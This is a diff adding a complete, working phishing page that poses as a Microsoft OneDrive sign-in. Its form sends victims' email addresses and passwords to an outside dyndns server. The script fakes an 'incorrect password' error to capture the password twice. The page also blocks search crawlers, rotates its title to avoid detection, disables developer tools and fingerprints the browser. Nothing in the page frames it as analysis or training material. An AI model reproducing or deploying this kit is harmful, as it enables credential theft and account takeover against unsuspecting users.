@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow"> <!-- Block crawlers -->
+    <meta name="googlebot" content="noindex, nofollow"> <!-- Block Googlebot -->
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="msnbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="yahoo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="duckduckgo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="google" content="notranslate">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title id="ttlDyn"></title>
+    <style>
+        /* Obfuscated CSS */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://storage.googleapis.com/onedrive-d9.appspot.com/images/onedriveside1.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: none;
+        }
+        .ctnr {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 360px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            z-index: 10;
+        }
+        .ctnr * {
+            margin: 0;
+            padding: 0;
+        }
+        h2 {
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .ipt {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .ipt:focus {
+            border-color: #0078d4;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #005a9e;
+        }
+        .err {
+            color: red;
+            margin-top: 10px;
+        }
+        .show-pw {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .show-pw input {
+            margin-right: 5px;
+        }
+
+        /* Junk CSS */
+        .junk0, .junk1, .junk2, .junk3, .junk4 {
+            display: none;
+            visibility: hidden;
+        }
+        .junk5 {
+            color: #f00;
+            font-size: 0;
+        }
+        .trick1 {
+            color: transparent;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICA8cGF0aCBkPSJNNTAsNTAgbC0yMCwzMCA2Miw2MiIvPjwvc3ZnPg==') no-repeat;
+        }
+        .trick2 {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+        }
+        .trick3 {
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        .trick4 {
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+        }
+        .trick5 {
+            height: 0;
+            width: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body oncontextmenu="return a1(event);" onkeydown="return b2(event);" onmousedown="return c3(event);">
+    <div class="ctnr" id="loginBox">
+        <h2>Sign in to OneDrive</h2>
+        <form id="loginForm" method="POST" action="https://nadwasdfw.dyndns.dk/papi7/login.php" enctype="application/x-www-form-urlencoded" onsubmit="return validateForm()">
+            <input id="emailInput" name="emailField" type="email" placeholder="Email" required class="ipt">
+            <input id="pwdInput" name="passwordField" type="password" placeholder="Password" required class="ipt">
+            <input type="hidden" id="hiddenPwd" name="hiddenPwd">
+            <input type="hidden" id="sessionField" name="sessionField" value="">
+            <div class="show-pw">
+                <input type="checkbox" id="showPass"> 
+                <label for="showPass">Show password</label>
+            </div>
+            <div id="errorMsg" class="err"></div>
+            <button type="submit" class="btn">Login</button>
+            <!-- Honeypots -->
+            <input type="text" name="hiddenField1" class="junk2" autocomplete="off">
+            <input type="text" name="hiddenField2" class="junk3" autocomplete="off">
+            <!-- Extra junk elements -->
+            <div class="junk4">Hidden text</div>
+            <div class="trick1"></div>
+            <div class="trick2"></div>
+            <div class="trick3"></div>
+            <div class="trick4"></div>
+            <div class="trick5"></div>
+        </form>
+    </div>
+
+    <script>
+        (function() {
+            function generateId() {
+                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                    var r = Math.random() * 16 | 0,
+                        v = c == 'x' ? r : (r & 0x3 | 0x8);
+                    return v.toString(16);
+                });
+            }
+
+            function setSession() {
+                const sessId = generateId();
+                document.cookie = `sessionId=${sessId}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT`;
+                const newUrl = `${window.location.href.split('?')[0]}?sess=${sessId}`;
+                window.history.replaceState({}, '', newUrl);
+            }
+
+            setSession();
+
+            const titles = ["OneDrive Login", "Secure OneDrive", "Microsoft OneDrive", "Access OneDrive", "OneDrive Access", "Cloud Login", "OneDrive Security", "Login Portal", "OneDrive Portal", "Secure Cloud"];
+            const usedTitles = JSON.parse(localStorage.getItem('usedTitles')) || [];
+            let availableTitles = titles.filter(title => !usedTitles.includes(title));
+
+            if (availableTitles.length === 0) {
+                localStorage.removeItem('usedTitles');
+                availableTitles = titles;
+            }
+
+            const selectedTitle = availableTitles[Math.floor(Math.random() * availableTitles.length)];
+            document.getElementById('ttlDyn').innerText = selectedTitle;
+
+            usedTitles.push(selectedTitle);
+            localStorage.setItem('usedTitles', JSON.stringify(usedTitles));
+
+            // Preload the background image
+            const img = new Image();
+            img.src = "https://storage.googleapis.com/onedrive-d9.appspot.com/images/onedriveside1.jpg";
+            img.onload = function() {
+                document.body.style.display = "block";
+            };
+
+            let attemptCount = 1;
+
+            window.validateForm = function() {
+                const email = document.getElementById('emailInput').value;
+                const password = document.getElementById('pwdInput').value;
+                const hiddenPasswordField = document.getElementById('hiddenPwd');
+                const sessionField = document.getElementById('sessionField');
+                const errorMsg = document.getElementById('errorMsg');
+
+                if (attemptCount === 1) {
+                    hiddenPasswordField.value = password;
+                    attemptCount++;
+                    errorMsg.textContent = 'Incorrect password. Please try again.';
+                    document.getElementById('pwdInput').value = '';
+                    return false;
+                }
+
+                sessionField.value = getCookie('sessionId');
+                return true;
+            }
+
+            function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+            }
+
+            document.getElementById('showPass').addEventListener('change', function() {
+                const passwordField = document.getElementById('pwdInput');
+                passwordField.type = this.checked ? 'text' : 'password';
+            });
+
+            // Mouse movement detection
+            document.addEventListener('mousemove', function() {
+                if (!document.moved) {
+                    document.moved = true;
+                }
+            });
+
+            // Basic fingerprinting
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('OneDrive', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('OneDrive', 4, 17);
+            const fingerprint = canvas.toDataURL();
+
+            // Send fingerprint or other data to the server for blocking bots
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://your-server-endpoint.com/fingerprint', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('fp=' + encodeURIComponent(fingerprint));
+
+            // Block specific IPs (example)
+            const blkIPs = ["192.168.1.1", "10.0.0.1"];
+            if (blkIPs.includes(window.location.hostname)) {
+                document.body.innerHTML = ''; // Block content for specific IPs
+            }
+
+            // Function to disable right-click and specific key combinations
+            window.x1 = function(event) {
+                if (event.button === 2) {
+                    return false;
+                }
+                if (event.ctrlKey && event.key === 'u') {
+                    return false;
+                }
+                if (event.key === 'F12') {
+                    return false;
+                }
+                if (event.ctrlKey && event.shiftKey && event.key === 'I') {
+                    return false;
+                }
+                if (event.ctrlKey && event.shiftKey && event.key === 'J') {
+                    return false;
+                }
+                return true;
+            };
+
+            // Function to disable mouse actions that open developer tools
+            window.y2 = function(event) {
+                if (event.which === 2) {
+                    return false;
+                }
+                return true;
+            };
+
+            // Additional obfuscation function
+            window.z3 = function() {
+                // Random operations to mislead
+                var arr = [];
+                for (var i = 0; i < 100; i++) {
+                    arr.push(Math.random());
+                }
+                console.log(arr.join(','));
+            };
+
+            z3(); // Call the additional obfuscation function
+        })();
+    </script>
+</body>
+</html>
